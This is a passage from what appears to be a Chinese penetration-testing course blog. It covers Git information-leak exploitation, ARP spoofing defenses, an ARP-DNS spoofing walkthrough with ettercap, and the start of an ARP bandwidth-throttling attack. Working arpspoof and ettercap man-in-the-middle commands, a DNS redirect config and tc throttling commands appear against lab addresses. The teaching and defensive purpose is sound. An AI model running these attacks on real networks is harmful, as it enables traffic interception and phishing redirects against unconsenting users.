</li><li>.git/refs/heads/master 记录了master的commit的hash </li><li>.git/objects/pack/.pack</li></ul><h2 id="Github搜索技巧"><a href="#Github搜索技巧" class="headerlink" title="Github搜索技巧"></a>Github搜索技巧</h2><ul><li>kali in:file 搜索文件中包含kali的代码 </li><li>kali in:path 搜索路径中包含kali的代码 </li><li>kali in:path,file 搜索路径、文件中包含kali的代码 </li><li>shodan language:python 搜索关键字shodan，语言为python的代码 </li><li>filename:config.php language:php 搜索文件名为config.php，且语言为php </li><li>kali topics:&gt;=5 标签数量大于等于5的 </li><li>kali size:&lt;1000 文件小于1KB的 </li><li>kali stars:10..50 star大于10小于50的 </li><li>kali pushed:&gt;2021-08-15 搜索在2021年8月15日之后提交的 </li><li>kali pushed:2021-07-01..2021-08-01 搜索在此区间 </li><li>kali created:&gt;=2021-06-01 创建时间 </li><li>kali pushed:&lt;2021-08-01 -language:java 搜索在2020年8月1日前push代码且排除java语</li></ul><h2 id="Git信息泄露利用方式"><a href="#Git信息泄露利用方式" class="headerlink" title="Git信息泄露利用方式"></a>Git信息泄露利用方式</h2><h3 id="找到-git"><a href="#找到-git" class="headerlink" title="找到.git"></a>找到.git</h3><ul><li>目录扫描 </li><li>robots.txt </li><li>搜索引擎搜索 — intitle:”Index of /.git”</li></ul><h3 id="把-git下载到本地"><a href="#把-git下载到本地" class="headerlink" title="把.git下载到本地"></a>把.git下载到本地</h3><ul><li><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> ——- python GitHack.py xxx.com/.git/ </li><li><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li><li><a href="https://github.com/wangyihang/githacker">https://github.com/wangyihang/githacker</a> </li><li><a href="https://github.com/WangWen-Albert/JGitHack">https://github.com/WangWen-Albert/JGitHack</a></li></ul><h3 id="用git的命令获取内容"><a href="#用git的命令获取内容" class="headerlink" title="用git的命令获取内容"></a>用git的命令获取内容</h3><ul><li>git log 获取提交记录</li><li>git reset –hard [log hash]  获取提交记录</li><li>git diff 获取提交记录</li></ul><h3 id="工具-9"><a href="#工具-9" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a> </p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h4 id="ctfhub技能树"><a href="#ctfhub技能树" class="headerlink" title="ctfhub技能树"></a>ctfhub技能树</h4><ul><li>Web——信息泄露——Git泄露——Log、Stash、 Index</li></ul><h4 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h4><ul><li>禁止套娃 </li><li>Mark loves cat</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8.ARP攻击防御</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/8.arp-gong-ji-fang-yu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/8.arp-gong-ji-fang-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP攻击防御"><a href="#ARP攻击防御" class="headerlink" title="ARP攻击防御"></a>ARP攻击防御</h1><h2 id="1-ARP防御方法简介"><a href="#1-ARP防御方法简介" class="headerlink" title="1.ARP防御方法简介"></a>1.ARP防御方法简介</h2><p>ARP攻击的原理是向网关和靶机<strong>不停的发送ARP欺骗报文</strong>，我们的计算机或者网关就会<strong>实时更新ARP缓存表</strong>，从而出现安全漏洞。</p><p>假如对这种欺骗报文的处理是不相信或者不接受的话，就不会出现问题了。处理这种的欺骗的行为我们没办法提前在攻击端进行操作，因为敌人躲在暗处，而我们处明处。</p><p>针对这种情况我们可以从以下两方面入手：</p><ol><li>让我们的电脑<strong>不接收</strong>欺骗包</li><li>即使接收到欺骗的包也<strong>不相信</strong></li></ol><p>目前网络安全行业现有的ARP防御方案，基本都是基于上面两个方法实现的。</p><h2 id="2-windows防御"><a href="#2-windows防御" class="headerlink" title="2.windows防御"></a>2.windows防御</h2><h3 id="1-安装arp的防火墙"><a href="#1-安装arp的防火墙" class="headerlink" title="1.安装arp的防火墙"></a>1.安装arp的防火墙</h3><h5 id="1-安装360安全卫士-地址：https-www-360-cn"><a href="#1-安装360安全卫士-地址：https-www-360-cn" class="headerlink" title="1.安装360安全卫士 地址：https://www.360.cn/"></a>1.安装360安全卫士 地址：<a href="https://www.360.cn/">https://www.360.cn/</a></h5><h5 id="2-选择网络安全"><a href="#2-选择网络安全" class="headerlink" title="2.选择网络安全"></a>2.选择网络安全</h5><p><img src=".%5Cassets%5C360%E9%80%89%E6%8B%A9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8.png" alt="360选择网络安全"></p><h5 id="3-选择流量防火墙"><a href="#3-选择流量防火墙" class="headerlink" title="3.选择流量防火墙"></a>3.选择流量防火墙</h5><p><img src=".%5Cassets%5C360%E9%80%89%E6%8B%A9%E6%B5%81%E9%87%8F%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="360选择流量防火墙"></p><h5 id="4-选择局域网防护开启防火墙"><a href="#4-选择局域网防护开启防火墙" class="headerlink" title="4.选择局域网防护开启防火墙"></a>4.选择局域网防护开启防火墙</h5><p><img src=".%5Cassets%5C360%E5%BC%80%E5%90%AF%E5%B1%80%E5%9F%9F%E7%BD%91%E9%98%B2%E6%8A%A4.png" alt="360开启局域网防护"></p><h5 id="5-开启ARP攻击"><a href="#5-开启ARP攻击" class="headerlink" title="5.开启ARP攻击"></a>5.开启ARP攻击</h5><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="6-查看防护效果"><a href="#6-查看防护效果" class="headerlink" title="6.查看防护效果"></a>6.查看防护效果</h5><p><img src=".%5Cassets%5C360%E6%9F%A5%E7%9C%8B%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C.png" alt="360查看防护效果"></p><h5 id="7-查询本地arp表"><a href="#7-查询本地arp表" class="headerlink" title="7.查询本地arp表"></a>7.查询本地arp表</h5><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="8-关闭防火墙（退出360安全卫士）"><a href="#8-关闭防火墙（退出360安全卫士）" class="headerlink" title="8.关闭防火墙（退出360安全卫士）"></a>8.关闭防火墙（退出360安全卫士）</h5><h5 id="9-查看当前arp表"><a href="#9-查看当前arp表" class="headerlink" title="9.查看当前arp表"></a>9.查看当前arp表</h5><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="10-停止攻击"><a href="#10-停止攻击" class="headerlink" title="10.停止攻击"></a>10.停止攻击</h5><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-设置静态mac地址"><a href="#2-设置静态mac地址" class="headerlink" title="2.设置静态mac地址"></a>2.设置静态mac地址</h3><h4 id="1-临时绑定，重启后失去保护效果"><a href="#1-临时绑定，重启后失去保护效果" class="headerlink" title="1.临时绑定，重启后失去保护效果"></a>1.临时绑定，重启后失去保护效果</h4><h5 id="1-ARP表MAC地址绑定状态"><a href="#1-ARP表MAC地址绑定状态" class="headerlink" title="1.ARP表MAC地址绑定状态"></a>1.ARP表MAC地址绑定状态</h5><p>ARP表MAC地址绑定类型有动态和静态两种。</p><ul><li><p>动态：有时效限制，会实时更新，不安全</p></li><li><p>静态：长久生效，不会随时间或者通知而变化，安全。</p></li></ul><p>我们来看一下电脑上的ARP表。</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>大部分都是动态的，动态的MAC地址他有生命周期，一定时间之后就会被替换，另外别人通知我更新的时候，也会被直接替换，也就是说无论是被动获取时发现变化了，还是主动被告知时已经变动了，arp列表都会进行更新。如果是攻击方告诉了靶机，他也会相信，从而导致被攻击。我们解决的方法就是把动态的MAC地址变成静态的。那么该如何绑定呢？</p><h5 id="2-绑定步骤"><a href="#2-绑定步骤" class="headerlink" title="2.绑定步骤"></a>2.绑定步骤</h5><p>1.Win10以管理员身份运行CMD命令提示符  </p><p>2.查询网关的ip和mac地址</p><pre class="line-numbers language-none"><code class="language-none">arp -a |findstr 192.168.70.1网关的IP：192.168.70.1网关的MAC地址：00-50-56-f3-07-7c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.查询本机的网卡</p><pre class="line-numbers language-none"><code class="language-none">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src=".%5Cassets%5C%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E7%BD%91%E5%8D%A1.png" alt="查看本机网卡"></p><p>4.查询本地连接的网卡ID号</p><pre class="line-numbers language-none"><code class="language-none">netsh i i show in#netsh i i show in  是netsh  interface ipv4 show interfaces 的缩写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从图中可以找到，Idx就是网卡的ID，以 Ethernet0也就是我本机的网卡，id=6</p><p><img src=".%5Cassets%5C%E6%9F%A5%E8%AF%A2%E7%BD%91%E5%8D%A1id.png" alt="查询网卡id"></p><p>5.<strong>临时</strong>绑定mac地址，重启失效</p><pre class="line-numbers language-none"><code class="language-none">netsh -c i i add neighbors&nbsp; 6 192.168.70.1 e4-3a-6e-35-98-00 store=active-c Context 指定上下文i: interface 更改到 `netsh interface' 上下文。i:ipv4add: 在项目列表上添加一个配置项目neighbors: 添加邻居地址store=active：设置为临时绑定查询帮助命令：netsh -c /?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src=".%5Cassets%5C%E4%B8%B4%E6%97%B6%E6%94%B9%E5%8F%98%E6%88%90%E9%9D%99%E6%80%81.png" alt="临时改变成静态"></p><p>6.发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.查询靶机ARP表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.停止ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9.重启靶机,查看arp表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10.重新发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11.查看靶机arp</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>12.停止攻击</p><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-永久绑定，重启后不失效"><a href="#2-永久绑定，重启后不失效" class="headerlink" title="2.永久绑定，重启后不失效"></a>2.永久绑定，重启后不失效</h4><p>1.绑定命令</p><pre class="line-numbers language-none"><code class="language-none">netsh -c i i add neighbors&nbsp; 6 192.168.110.1 e4-3a-6e-35-98-00 store=persistentstore=persistent：永久绑定<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.查看ARP表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.查看arp缓存表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.重启电脑，查看ARP表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.删除静态配置</p><pre class="line-numbers language-none"><code class="language-none">arp -d ip #不推荐使用，下次设置时，出现错误netsh -c i i delete ne 6  #推荐使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>7.查看靶机arp表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.停止攻击</p><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-linux防御"><a href="#3-linux防御" class="headerlink" title="3.linux防御"></a>3.linux防御</h2><h4 id="1-查询arp表命令"><a href="#1-查询arp表命令" class="headerlink" title="1.查询arp表命令"></a>1.查询arp表命令</h4><pre class="line-numbers language-none"><code class="language-none">arp -aip n ip neigh 192.168.110.1 dev ens33 lladdr e4:3a:6e:35:98:00 STALE #不新鲜的192.168.110.1 dev ens33 lladdr e4:3a:6e:35:98:00 REACHABLE #可到达的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-临时添加静态地址，重启后失效"><a href="#2-临时添加静态地址，重启后失效" class="headerlink" title="2.临时添加静态地址，重启后失效"></a>2.临时添加静态地址，重启后失效</h4><pre class="line-numbers language-none"><code class="language-none">arp -s 192.168.70.1 00:50:56:c0:00:08<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-查询arp表"><a href="#3-查询arp表" class="headerlink" title="3.查询arp表"></a>3.查询arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n192.168.110.1 dev ens33 lladdr e4:3a:6e:35:98:00 PERMANENT #永久的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-发起ARP攻击"><a href="#4-发起ARP攻击" class="headerlink" title="4.发起ARP攻击"></a>4.发起ARP攻击</h4><pre class="line-numbers language-none"><code class="language-none">ettercap -T -i eth0  -M arp:remote /192.168.110.1// /192.168.110.26// <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-查看靶机arp表"><a href="#5-查看靶机arp表" class="headerlink" title="5.查看靶机arp表"></a>5.查看靶机arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-重启靶机"><a href="#6-重启靶机" class="headerlink" title="6.重启靶机"></a>6.重启靶机</h4><pre class="line-numbers language-none"><code class="language-none">reboot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-查看靶机arp表"><a href="#7-查看靶机arp表" class="headerlink" title="7.查看靶机arp表"></a>7.查看靶机arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-将其添加到-rc-local里边-开启自动执行"><a href="#8-将其添加到-rc-local里边-开启自动执行" class="headerlink" title="8.将其添加到 rc.local里边 开启自动执行"></a>8.将其添加到 rc.local里边 开启自动执行</h4><pre class="line-numbers language-none"><code class="language-none">vi  /etc/rc.localchmod +x /etc/rc.d/rc.local添加：arp -s 192.168.110.1 e4:3a:6e:35:98:00wq保存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-重启centos7"><a href="#9-重启centos7" class="headerlink" title="9.重启centos7"></a>9.重启centos7</h4><pre class="line-numbers language-none"><code class="language-none">reboot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-查看arp表"><a href="#10-查看arp表" class="headerlink" title="10.查看arp表"></a>10.查看arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-路由-x2F-网关防护设置"><a href="#4-路由-x2F-网关防护设置" class="headerlink" title="4.路由/网关防护设置"></a>4.路由/网关防护设置</h2><h3 id="1-打开路由器配置网站"><a href="#1-打开路由器配置网站" class="headerlink" title="1.打开路由器配置网站"></a>1.打开路由器配置网站</h3><p>​一般是http://网关ip</p><h3 id="2-点击更多功能"><a href="#2-点击更多功能" class="headerlink" title="2.点击更多功能"></a>2.点击更多功能</h3><p><img src=".%5Cassets%5C%E8%B7%AF%E7%94%B1%E5%99%A8-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD.png" alt="路由器-更多功能"></p><h3 id="3-选择网络设置–局域网"><a href="#3-选择网络设置–局域网" class="headerlink" title="3.选择网络设置–局域网"></a>3.选择网络设置–局域网</h3><p><img src=".%5Cassets%5C%E8%B7%AF%E7%94%B1-%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE.png" alt="路由-网络设置"></p><h3 id="4-添加静态ip地址绑定列表"><a href="#4-添加静态ip地址绑定列表" class="headerlink" title="4.添加静态ip地址绑定列表"></a>4.添加静态ip地址绑定列表</h3><p><img src=".%5Cassets%5C%E8%B7%AF%E7%94%B1%E5%99%A8-%E6%B7%BB%E5%8A%A0%E9%9D%99%E6%80%81ip%E5%9C%B0%E5%9D%80%E7%BB%91%E5%AE%9A.png" alt="路由器-添加静态ip地址绑定"></p><h3 id="5-手动添加绑定"><a href="#5-手动添加绑定" class="headerlink" title="5.手动添加绑定"></a>5.手动添加绑定</h3><p><img src=".%5Cassets%5C%E8%B7%AF%E7%94%B1%E6%89%8B%E5%8A%A8%E9%85%8D%E7%BD%AEmac%E5%9C%B0%E5%9D%80.png" alt="路由手动配置mac地址"></p><h2 id="5-WEB服务防御ARP攻击"><a href="#5-WEB服务防御ARP攻击" class="headerlink" title="5.WEB服务防御ARP攻击"></a>5.WEB服务防御ARP攻击</h2><p>web服务防御明文传输泄露用户信息的手段：使用加密协议:https</p><h3 id="1-什么是HTTP"><a href="#1-什么是HTTP" class="headerlink" title="1.什么是HTTP"></a>1.什么是HTTP</h3><p>超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。使用明文传输，容易被劫持。</p><h3 id="2-什么是HTTPS"><a href="#2-什么是HTTPS" class="headerlink" title="2.什么是HTTPS"></a>2.什么是HTTPS</h3><p>《图解HTTP》这本书中曾提过HTTPS是身披SSL外壳的HTTP。HTTPS是一种通过计算机网络进行安全通信的传输协议，经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS使用的主要目的是提供对网站服务器的身份认证，同时保护交换数据的隐私与完整性。使用加密传输，不容易被拦截，更加安全。</p><p>TLS是传输层加密协议，前身是SSL协议，由网景公司1995年发布，有时候两者不区分。</p><h3 id="3-HTTPS加密通讯工作原理"><a href="#3-HTTPS加密通讯工作原理" class="headerlink" title="3.HTTPS加密通讯工作原理"></a>3.HTTPS加密通讯工作原理</h3><p><img src=".%5Cassets%5CHTTPS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.png" alt="HTTPS工作原理"></p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>请参照：ARP攻击防御.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7.ARP-DNS欺诈</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/7.arp-dns-qi-pian/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/7.arp-dns-qi-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>DNS是Domain Name System的缩写,我们称之域名系统。首先它是远程调用服务,本地默认占用53端口，它本身的实质上-一个域名和ip的数据库服务器，他要完成的任务是帮我们把输入的域名转换成ip地址，之后通过ip寻址连接目标服务器。</p><h2 id="DNS工作过程"><a href="#DNS工作过程" class="headerlink" title="DNS工作过程"></a>DNS工作过程</h2><p>当访问一个网站时系统将从DNS缓存中读取该域名所对应的IP地址，当查找不到时就会到系统中查找hosts文件,如果还没有那么才会向DNS服务器请求一个DNS查询， DNS服务器将返回该域名所对应的IP,在你的系统收到解析地址以后将使用该IP地址进行访问，同时将解析缓存到本地的DNS缓存中。</p><p><img src="assets/image-20221223143711807.png" alt="image-20221223143711807"></p><h1 id="什么是DNS劫持"><a href="#什么是DNS劫持" class="headerlink" title="什么是DNS劫持"></a>什么是DNS劫持</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求,分析请求的域名，把审查范围以外的求放行，否则返回假的IP地址或者什么都不做使请求失去响应,效果就是<strong>对特定的网络不能访问或访问的是假网址</strong>。</p><h2 id="ettercap劫持的原理"><a href="#ettercap劫持的原理" class="headerlink" title="ettercap劫持的原理"></a>ettercap劫持的原理</h2><p>局域网劫持,攻击者通过伪装成<strong>网关</strong>，劫持受害者的网络请求将网络请求拦截到指定的服务器</p><h2 id="DNS常用命令"><a href="#DNS常用命令" class="headerlink" title="DNS常用命令"></a>DNS常用命令</h2><h3 id="查看DNS缓存表"><a href="#查看DNS缓存表" class="headerlink" title="查看DNS缓存表"></a>查看DNS缓存表</h3><p><code>ipconfig /displaydns</code></p><h3 id="获取DNS地址"><a href="#获取DNS地址" class="headerlink" title="获取DNS地址"></a>获取DNS地址</h3><p><code>ping baidu.com</code></p><h3 id="刷新DNS缓存"><a href="#刷新DNS缓存" class="headerlink" title="刷新DNS缓存"></a>刷新DNS缓存</h3><p><code>ipconfig /flushdns</code></p><h1 id="ARP-DNS欺骗攻击步骤"><a href="#ARP-DNS欺骗攻击步骤" class="headerlink" title="ARP-DNS欺骗攻击步骤"></a>ARP-DNS欺骗攻击步骤</h1><h2 id="kali开启apache"><a href="#kali开启apache" class="headerlink" title="kali开启apache"></a>kali开启apache</h2><p><code>service apache2 start</code></p><h3 id="查看apache状态"><a href="#查看apache状态" class="headerlink" title="查看apache状态"></a>查看apache状态</h3><p><code>service apache2 status</code></p><h3 id="浏览器访问Apache的首页"><a href="#浏览器访问Apache的首页" class="headerlink" title="浏览器访问Apache的首页"></a>浏览器访问Apache的首页</h3><p><a href="http://192.168.70.3/">http://192.168.70.3</a></p><h2 id="编辑ettercap配置文件"><a href="#编辑ettercap配置文件" class="headerlink" title="编辑ettercap配置文件"></a>编辑ettercap配置文件</h2><h3 id="进入配置文件位置"><a href="#进入配置文件位置" class="headerlink" title="进入配置文件位置"></a>进入配置文件位置</h3><p><code>cd /etc/ettercap</code></p><h3 id="复制原有的配置文件（环境恢复方便）"><a href="#复制原有的配置文件（环境恢复方便）" class="headerlink" title="复制原有的配置文件（环境恢复方便）"></a>复制原有的配置文件（环境恢复方便）</h3><p><code>cp etter.dns etter.dns1</code></p><h3 id="设置DNS劫持配置文件"><a href="#设置DNS劫持配置文件" class="headerlink" title="设置DNS劫持配置文件"></a>设置DNS劫持配置文件</h3><p><code>vim /etc/ettercap/etter.dns</code></p><p>添加以下内容</p><pre class="line-numbers language-none"><code class="language-none">*  A   192.168.70.3*  PTR 192.168.70.3www.*.com A 192.168.70.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>wq</code>保存</p><p>参数</p><ul><li>*：表示所有网站，也可以设置某个网站 <a href="http://www.baidu.com/">www.baidu.com</a></li><li>A:表示钓鱼的ip地址</li><li>PTR:常被用于方向地址解析</li></ul><h3 id="ettercap劫持命令讲解"><a href="#ettercap劫持命令讲解" class="headerlink" title="ettercap劫持命令讲解"></a>ettercap劫持命令讲解</h3><pre class="line-numbers language-none"><code class="language-none">ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关//-i:网卡-T：问本模式-q:安静模式-M:执行mitml攻击-P：plugin 开始该插件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="靶机访问网页确认环境正常"><a href="#靶机访问网页确认环境正常" class="headerlink" title="靶机访问网页确认环境正常"></a>靶机访问网页确认环境正常</h3><ul><li><p><a href="http://www.mashibing.com/">http://www.mashibing.com/</a></p></li><li><p><a href="http://m.ctrip.com/">http://m.ctrip.com</a></p></li><li><p><a href="http://www.dj.com/">http://www.dj.com/</a></p></li><li><p>ping <a href="http://www.mashibing.com/">http://www.mashibing.com/</a></p></li><li><p>ping <a href="http://m.ctrip.com/">http://m.ctrip.com</a></p></li><li><p>ping <a href="http://www.dj.com/">http://www.dj.com/</a></p></li></ul><h2 id="执行劫持命令"><a href="#执行劫持命令" class="headerlink" title="执行劫持命令"></a>执行劫持命令</h2><pre class="line-numbers language-none"><code class="language-none">ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /192.168.70.130// /192.168.70.2// &gt;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="分析日志"><a href="#分析日志" class="headerlink" title="分析日志"></a>分析日志</h3><p><code>tail -f b.txt</code></p><p>或者</p><p><code>tail -f b.txt | grep "dns_spoof"</code></p><h3 id="靶机访问http网站查看攻击效果"><a href="#靶机访问http网站查看攻击效果" class="headerlink" title="靶机访问http网站查看攻击效果"></a>靶机访问http网站查看攻击效果</h3><ul><li><a href="http://www.mashibing.com/">http://www.mashibing.com/</a></li><li><a href="http://m.ctrip.com/">http://m.ctrip.com</a></li><li><a href="http://www.dj.com/">http://www.dj.com/</a></li></ul><h2 id="停止劫持"><a href="#停止劫持" class="headerlink" title="停止劫持"></a>停止劫持</h2><p>ctrl+c</p><h2 id="恢复dns劫持，刷新dns缓存"><a href="#恢复dns劫持，刷新dns缓存" class="headerlink" title="恢复dns劫持，刷新dns缓存"></a>恢复dns劫持，刷新dns缓存</h2><p><code>ipconfig /flushdns</code></p><h3 id="靶机访问网站查看环境是否恢复正常"><a href="#靶机访问网站查看环境是否恢复正常" class="headerlink" title="靶机访问网站查看环境是否恢复正常"></a>靶机访问网站查看环境是否恢复正常</h3><ul><li><a href="http://www.dj.com/">http://www.dj.com/</a></li></ul><p>ping <a href="http://www.dj.com/">www.dj.com</a></p><h2 id="恢复kali环境"><a href="#恢复kali环境" class="headerlink" title="恢复kali环境"></a>恢复kali环境</h2><h4 id="进入配置文件位置-1"><a href="#进入配置文件位置-1" class="headerlink" title="进入配置文件位置"></a>进入配置文件位置</h4><p><code>cd /etc/ettercap</code></p><h4 id="复制dns文件到新wen文件"><a href="#复制dns文件到新wen文件" class="headerlink" title="复制dns文件到新wen文件"></a>复制dns文件到新wen文件</h4><p><code>cp etter.dns etter.dns2</code></p><h4 id="还原dns配置文件"><a href="#还原dns配置文件" class="headerlink" title="还原dns配置文件"></a>还原dns配置文件</h4><p><code>cp etter.dns1 etter.dns</code></p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6.ARP限制网速攻击</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/6.arp-xian-zhi-wang-su/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/6.arp-xian-zhi-wang-su/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP限制网速攻击"><a href="#ARP限制网速攻击" class="headerlink" title="ARP限制网速攻击"></a>ARP限制网速攻击</h1><p>大家没想到吧，ARP还能限制对方网速。当kali欺骗了网关和受害者的时候，受害者访问网络就需要经过kali的网卡，那我们限制kali网卡的速度或者转发的速度就可以限制对方的网速。这里可以使用的工具有tc、iptables、WonderShaper等等，我们以tc为例，tc是通过限制网卡的速度来限制对方的，是一种杀敌一千自损八百的手段。</p><h2 id="1-TC工具介绍"><a href="#1-TC工具介绍" class="headerlink" title="1.TC工具介绍"></a>1.TC工具介绍</h2><p>在Linux中，流量控制都是通过TC这个工具来完成的。通常， 要对网卡进行流量控制的配置，需要进行如下的步骤:</p><p>◆ 为网卡配置一个队列;</p><p>◆ 在该队列上建立分类;</p><p>◆ 根据需要建立子队列和子分类;</p><p>◆ 为每个分类建立过滤器。</p><p>需要注意的是， 在TC 中使用下列的缩写表示相应的网络延迟:</p><p>时间的计量单位：</p><ul><li><p>s、sec或者secs               秒</p></li><li><p>ms、msec或者msecs            毫秒</p></li><li><p>us、usec、usecs或者一个无单位数字  微秒</p></li></ul><p>QDisc(排队规则) [qdɪsk]是queueing discipline [ˈkjuːɪŋ] [ˈdɪsəplɪn] 的简写，它是理解流量控制(traffic control)的基础。无论何时，内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的qdisc(排队规则)把数据包加入队列。然后，内核会尽可能多地从qdisc里面取出数据包，把它们交给网络适配器驱动模块。</p><h2 id="2-TC命令介绍"><a href="#2-TC命令介绍" class="headerlink" title="2.TC命令介绍"></a>2.TC命令介绍</h2><h4 id="1-限制网速200ms延时"><a href="#1-限制网速200ms延时" class="headerlink" title="1.限制网速200ms延时"></a>1.限制网速200ms延时</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc add dev eth0 root netem delay 200ms参数：qdisc：排队规则add:添加dev：设备（网卡）root：root用户身份netem delay：设置网络延时时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-取消限制网速200ms延时"><a 